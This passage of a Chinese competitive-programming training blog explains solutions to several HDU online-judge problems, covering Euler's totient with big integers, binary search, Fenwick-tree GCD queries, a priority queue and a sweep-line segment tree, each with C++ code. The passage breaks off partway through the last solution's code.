        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HHUACM 综合训练2</title>
      <url>/blog/2016/09/22/hhutraining2/</url>
      <content type="html"><![CDATA[<p>本次综合训练主要是2013年的大连online的题目，有难有易，其中题意不太清楚和要求非常高的题目就直接剔除了。这样题数少了，于是又加了2题2016年大连online的我觉得挺不错的题目。后来发现知识点有点重叠，不过训练一下也无妨。</p><h3 id="Find-the-maximum"><a href="#Find-the-maximum" class="headerlink" title="Find the maximum"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=4002" target="_blank" rel="noopener">Find the maximum</a></h3><p>题意：给出 $N$ 求出最小的 $2\leq n\leq N$ 使得 $n/\varphi(n)$ 最大。<br>题解：做这题首先要知道 $\varphi(n)$ 的计算式（不作证明）: $\varphi(n)=n(1-\frac{1}{p_{1}})(1-\frac{1}{p_{2}})…(1-\frac{1}{p_{k}})$<br>$$\therefore n/\varphi(n)=\frac{1}{(1-\frac{1}{p_{1}})(1-\frac{1}{p_{2}})…(1-\frac{1}{p_{k}})}$$ $$=\frac{1}{\frac{p_1-1}{p_1}\frac{p_2-1}{p_2}…\frac{p_k-1}{p_k}}$$ $$=\frac{p_1}{p_1-1}\frac{p_2}{p_2-1}…\frac{p_k}{p_k-1}$$ $$=(1+\frac{1}{p_1-1})(1+\frac{1}{p_2-1})…(1+\frac{1}{p_k-1})$$<br>其中 $p_1,p_2,…p_k$ 为 $n$ 的质因子。（考虑到大家提交的很多代码都是打表，这里我写的比较详细）</p><p>明显地：</p><ol><li>$p_1,p_2,…p_k$ 越小，$n$ 越小，而且 $n/\varphi(n)$ 越大；</li><li>$p_1,p_2,…p_k$ 的次方数没有贡献。<br>所以，只需要把最小的那些质数乘起来，就能得到满足条件的 $n$<br>为了增加(编程)难度，这题又加入了高精度，套用模板，代码如下：</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div></pre></td><td class="code"><pre><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &lt;cstdio&gt;</div><div class="line">#include &lt;cstring&gt;</div><div class="line">using namespace std;</div><div class="line"></div><div class="line">const int MAX=1000000;</div><div class="line">int pr[100000],pt=0;</div><div class="line">bool f[MAX];</div><div class="line">char s[110];</div><div class="line">struct BigInt &#123;</div><div class="line">    const static int mod = 10000;</div><div class="line">    const static int DLEN = 4;</div><div class="line">    int a[100],len;</div><div class="line">    BigInt() &#123;</div><div class="line">        memset(a,0,sizeof(a));</div><div class="line">        len = 1;</div><div class="line">    &#125;</div><div class="line">    BigInt(int v) &#123;</div><div class="line">        memset(a,0,sizeof(a));</div><div class="line">        len = 0;</div><div class="line">        do &#123;</div><div class="line">            a[len++] = v%mod;</div><div class="line">            v /= mod;</div><div class="line">        &#125; while(v);</div><div class="line">    &#125;</div><div class="line">    BigInt(const char s[]) &#123;</div><div class="line">        memset(a,0,sizeof(a));</div><div class="line">        int L = strlen(s);</div><div class="line">        len = L/DLEN;</div><div class="line">        if(L%DLEN)len++;</div><div class="line">        int index = 0;</div><div class="line">        for(int i = L-1; i &gt;= 0; i -= DLEN) &#123;</div><div class="line">            int t = 0;</div><div class="line">            int k = i - DLEN + 1;</div><div class="line">            if(k &lt; 0)k = 0;</div><div class="line">            for(int j = k; j &lt;= i; j++)</div><div class="line">                t = t*10 + s[j] - '0';</div><div class="line">            a[index++] = t;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    BigInt operator +(const BigInt &amp;b)const &#123;</div><div class="line">        BigInt res;</div><div class="line">        res.len = max(len,b.len);</div><div class="line">        for(int i = 0; i &lt;= res.len; i++)</div><div class="line">            res.a[i] = 0;</div><div class="line">        for(int i = 0; i &lt; res.len; i++) &#123;</div><div class="line">            res.a[i] += ((i &lt; len)?a[i]:0)+((i &lt; b.len)?b.a[i]:0);</div><div class="line">            res.a[i+1] += res.a[i]/mod;</div><div class="line">            res.a[i] %= mod;</div><div class="line">        &#125;</div><div class="line">        if(res.a[res.len] &gt; 0)res.len++;</div><div class="line">        return res;</div><div class="line">    &#125;</div><div class="line">    BigInt operator *(const BigInt &amp;b)const &#123;</div><div class="line">        BigInt res;</div><div class="line">        for(int i = 0; i &lt; len; i++) &#123;</div><div class="line">            int up = 0;</div><div class="line">            for(int j = 0; j &lt; b.len; j++) &#123;</div><div class="line">                int temp = a[i]*b.a[j] + res.a[i+j] + up;</div><div class="line">                res.a[i+j] = temp%mod;</div><div class="line">                up = temp/mod;</div><div class="line">            &#125;</div><div class="line">            if(up != 0)</div><div class="line">                res.a[i + b.len] = up;</div><div class="line">        &#125;</div><div class="line">        res.len = len + b.len;</div><div class="line">        while(res.a[res.len - 1] == 0 &amp;&amp;res.len &gt; 1)res.len--;</div><div class="line">        return res;</div><div class="line">    &#125;</div><div class="line">    bool operator &gt;(const BigInt &amp;b)const &#123;</div><div class="line">        if (len==b.len) &#123;</div><div class="line">            int k=len-1;</div><div class="line">            while (k&amp;&amp;a[k]==b.a[k]) k--;</div><div class="line">            if (k&lt;0) return false;</div><div class="line">            return a[k]&gt;b.a[k];</div><div class="line">        &#125;</div><div class="line">        return len&gt;b.len;</div><div class="line">    &#125;</div><div class="line">    void output() &#123;</div><div class="line">        printf("%d",a[len-1]);</div><div class="line">        for(int i = len-2; i &gt;=0 ; i--)</div><div class="line">            printf("%04d",a[i]);</div><div class="line">        printf("\n");</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">void init_pr()</div><div class="line">&#123;</div><div class="line">    for (int i=2;i&lt;MAX;i++) &#123;</div><div class="line">        if (!f[i]) pr[++pt]=i;</div><div class="line">        for (int j=1;j&lt;=pt;j++) &#123;</div><div class="line">            if (i*pr[j]&gt;=MAX) break;</div><div class="line">            f[i*pr[j]]=1;</div><div class="line">            if (i%pr[j]==0) break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    init_pr();</div><div class="line">    int T;</div><div class="line">    scanf("%d",&amp;T);</div><div class="line">    while (T--) &#123;</div><div class="line">        scanf("%s",s);</div><div class="line">        BigInt n(s);</div><div class="line">        BigInt a(1),b(1);</div><div class="line">        for (int i=1;i&lt;=pt;i++) &#123;</div><div class="line">            BigInt tmp(pr[i]);</div><div class="line">            b=a*tmp;</div><div class="line">            if (b&gt;n) break;</div><div class="line">            a=b;</div><div class="line">        &#125;</div><div class="line">        a.output();</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="The-Frog’s-Games"><a href="#The-Frog’s-Games" class="headerlink" title="The Frog’s Games"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=4004" target="_blank" rel="noopener">The Frog’s Games</a></h3><p>题意：青蛙要跳过一条长为 $L$ ，两岸之间有 $n$ 块石头的河，最多只能跳 $m$ 次，求青蛙至少需要的跳跃能力（跳一次的最大长度）。<br>题解：可以发现，最后的答案具有单调性，即，若跳跃能力 $k$ 可以跳过这条河，那么跳跃能力 $x(x\geq k)$ 一定能跳过这条河。<br>由此，使用二分答案可以解决，代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">500010</span>;</div><div class="line"><span class="keyword">int</span> a[N];</div><div class="line"><span class="keyword">int</span> L,n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> l)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,pre=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;) &#123;</div><div class="line">        <span class="keyword">while</span> (pre+l&gt;=a[i]&amp;&amp;i&lt;=n+<span class="number">1</span>) i++;</div><div class="line">        pre=a[i<span class="number">-1</span>];</div><div class="line">        <span class="keyword">if</span> (++cnt&gt;m) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bs</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (l&lt;r) &#123;</div><div class="line">        <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (check(m)) r=m;</div><div class="line">        <span class="keyword">else</span> l=m+<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> l;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;L,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        sort(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</div><div class="line">        <span class="keyword">int</span> l=L,r=L;a[n+<span class="number">1</span>]=L;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;i++)</div><div class="line">            l=min(a[i]-a[i<span class="number">-1</span>],l);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,bs(l,r));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="Different-GCD-Subarray-Query"><a href="#Different-GCD-Subarray-Query" class="headerlink" title="Different GCD Subarray Query"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5869" target="_blank" rel="noopener">Different GCD Subarray Query</a></h3><p>题意：给出 $N$ 个数，每次询问 $[L,R]$ 的子数组（类似子串）的 $GCD$ 有多少不同的值。<br>题解：做这题首先要知道一个结论，值为 $X$ 的数连续地跟其它数进行 $GCD$ 运算，最多出现 $\left \lfloor log_{2}{X}\right \rfloor$ 个不同的数。这个结论刚听到可能很新鲜，但其实很好理解，$GCD$ 运算之后出现了新的 $X$ ，说明新的 $X$ 至少少了一个质因子。而质因子最多有 $\lfloor log_{2}{X}\rfloor$ 个。所以 $GCD$ 个数最多也就 $NlogMAX$ 个，可以用 $map$ 来保存。<br>其次还需要知道一个技巧，如何统计一个区间内不同的数。对于一个右端点 $R$ ,我们保存能使得值 $X$ 出现的最大的 $L$ ，并在 $L$ 这一点加1，那么每次询问的答案就是 $[L,R]$ 的区间和。<br>这样把所有询问离线并排序以后，就可以从 $1$ 开始枚举右端点，代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; PII;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">1000010</span>;</div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; d[<span class="number">2</span>],cur;</div><div class="line"><span class="keyword">struct</span> query &#123;</div><div class="line">    <span class="keyword">int</span> l,r,id;</div><div class="line">    <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> query&amp; b) <span class="keyword">const</span> &#123;</div><div class="line">        <span class="keyword">return</span> r&lt;b.r;</div><div class="line">    &#125;</div><div class="line">&#125; q[N];</div><div class="line"><span class="keyword">int</span> a[N],ans[N];</div><div class="line"><span class="keyword">int</span> c[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!b) <span class="keyword">return</span> a;</div><div class="line">    <span class="keyword">return</span> gcd(b,a%b);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ins</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (;x&lt;MAX;x+=x&amp;(-x)) &#123;</div><div class="line">        c[x]+=d;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!x) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;x&gt;<span class="number">0</span>;x-=x&amp;(-x)) &#123;</div><div class="line">        res+=c[x];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        d[<span class="number">0</span>].clear();</div><div class="line">        d[<span class="number">1</span>].clear();</div><div class="line">        cur.clear();</div><div class="line">        <span class="built_in">memset</span>(c,<span class="number">0</span>,<span class="keyword">sizeof</span>(c));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;q[i].l,&amp;q[i].r);</div><div class="line">            q[i].id=i;</div><div class="line">        &#125;</div><div class="line">        sort(q+<span class="number">1</span>,q+<span class="number">1</span>+m);</div><div class="line">        <span class="keyword">int</span> now=<span class="number">1</span>,pre=<span class="number">0</span>,k=<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;::iterator it=d[pre].begin();it!=d[pre].end();it++) &#123;</div><div class="line">                <span class="keyword">int</span> x=gcd(a[i],it-&gt;first);</div><div class="line">                d[now][x]=max(d[now][x],it-&gt;second);</div><div class="line">            &#125;</div><div class="line">            d[now][a[i]]=i;</div><div class="line">            <span class="keyword">for</span> (<span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;::iterator it=d[now].begin();it!=d[now].end();it++) &#123;</div><div class="line">                <span class="keyword">int</span> x=it-&gt;first;</div><div class="line">                <span class="keyword">if</span> (cur.count(x)&amp;&amp;cur[x]&lt;(it-&gt;second)) &#123;</div><div class="line">                    ins(cur[x],<span class="number">-1</span>);</div><div class="line">                    ins(it-&gt;second,<span class="number">1</span>);</div><div class="line">                    cur[x]=it-&gt;second;</div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!cur.count(x)) &#123;</div><div class="line">                    ins(it-&gt;second,<span class="number">1</span>);</div><div class="line">                    cur[x]=it-&gt;second;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            d[pre].clear();</div><div class="line">            swap(pre,now);</div><div class="line">            <span class="keyword">for</span> (;k&lt;=m&amp;&amp;q[k].r==i;k++) &#123;</div><div class="line">                ans[q[k].id]=query(q[k].r)-query(q[k].l<span class="number">-1</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans[i]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="The-kth-great-number"><a href="#The-kth-great-number" class="headerlink" title="The kth great number"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=4006" target="_blank" rel="noopener">The kth great number</a></h3><p>题意：给 $n$ 个操作，支持插入和求第 $k$ 大。<br>题解：一定要认真读题！这道题目的 $k$ 是一开始就给定的，是不会变的！<br>理解了这一点这就是一道水题，代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,k;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;k)!=EOF) &#123;</div><div class="line">        priority_queue&lt; <span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,greater&lt;<span class="keyword">int</span>&gt; &gt; Q;</div><div class="line">        <span class="keyword">while</span> (n--) &#123;</div><div class="line">            <span class="keyword">char</span> s[<span class="number">5</span>];</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</div><div class="line">            <span class="keyword">if</span> (s[<span class="number">0</span>]==<span class="string">'I'</span>) &#123;</div><div class="line">                <span class="keyword">int</span> x;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</div><div class="line">                Q.push(x);</div><div class="line">                <span class="keyword">if</span> (Q.size()&gt;k) Q.pop();</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,Q.top());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="Dave"><a href="#Dave" class="headerlink" title="Dave"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=4007" target="_blank" rel="noopener">Dave</a></h3><p>题意：在二维平面上给 $N$ 个不重合的点，问边长为 $R$ 的正方形最多能包含多少个点（包含边界）<br>题解：因为这一题 $1\leq N\leq 1000$ ，所以只要枚举每个点作为左下角的情况就行了（为什么？）<br>如果 $1\leq N\leq 10000$ ，那么可以用扫描线+线段树的解法。先离散化，并将所有点按照 $x$ $y$ 两个关键字从小到大排序，我们想象垂直于 $x$ 轴有两条间距为 $R$ 的直线，这两条线不断的向右移动，右边的一些点会进入，左边的一些点会退出。那要怎么统计呢？这里要用到一个奇妙的处理，把每一个点向上延伸 $R$ 产生的这条线段加到线段树，也就是区间加1，最后只要每次统计从最低到最高的每个点的最大值就行了（为什么？）<br>这个做法听起来很简单，不过由于离散化等原因，很容易写错（WA3 = =），代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &lt;cstdio&gt;</div><div class="line">#include &lt;cstring&gt;</div><div class="line">#include &lt;algorithm&gt;</div><div class="line">using namespace std;</div><div class="line"></div><div class="line">#define lson l,m,rt&lt;&lt;1</div><div class="line">#define rson m+1,r,rt&lt;&lt;1|1</div><div class="line"></div><div class="line">const int N=1010;</div><div class="line">typedef long long ll;</div><div class="line">struct point &#123;</div><div class="line">    int x,y,ix,iy;</div><div class="line">    bool operator &lt; (const point&amp; b) &#123;</div><div class="line">        return ix&lt;b.ix;</div><div class="line">    &#125;</div><div class="line">&#125; p[N];</div><div class="line">int qx[N],qy[N];</div><div class="line">ll add[N&lt;&lt;2],sum[N&lt;&lt;2];</div><div class="line">int n,r,cntx,cnty;</div><div class="line"></div><div class="line">void push_up(int rt)</div><div class="line">&#123;</div><div class="line">    sum[rt]=max(sum[rt&lt;&lt;1],sum[rt&lt;&lt;1|1]);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void push_down(int rt)</div><div class="line">&#123;</div><div class="line">    if (add[rt]) &#123;</div><div class="line">        add[rt&lt;&lt;1] += add[rt];</div><div class="line">        add[rt&lt;&lt;1|1] += add[rt];</div><div class="line">        sum[rt&lt;&lt;1] += add[rt];</div><div class="line">        sum[rt&lt;&lt;1|1] += add[rt];</div><div class="line">        add[rt] = 0;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void update(int L,int R,int d,int l,int r,int rt)</div><div class="line">&#123;</div><div class="line">    if (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">        